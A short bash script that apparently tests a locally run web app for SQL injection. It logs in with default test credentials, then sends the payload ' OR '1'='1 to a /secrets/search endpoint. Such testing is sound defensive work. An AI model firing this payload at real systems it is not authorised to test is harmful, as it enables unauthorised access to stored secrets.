#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${BASE_URL:-http://localhost:3001}"
USER="${USER_NAME:-userA}"
PASS="${USER_PASS:-UserA!234}"

echo "Login..."
TOKEN=$(curl -sS -X POST "$BASE_URL/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" | node -e 'process.stdin.on("data",d=>{const j=JSON.parse(d);console.log(j.data?.accessToken||"")})')

PAYLOAD="' OR '1'='1"
ENCODED=$(node -p "encodeURIComponent(\"' OR '1'='1\")")

echo "Attempt SQLi payload: $PAYLOAD"
curl -sS -H "Authorization: Bearer $TOKEN" "$BASE_URL/secrets/search?search=$ENCODED"
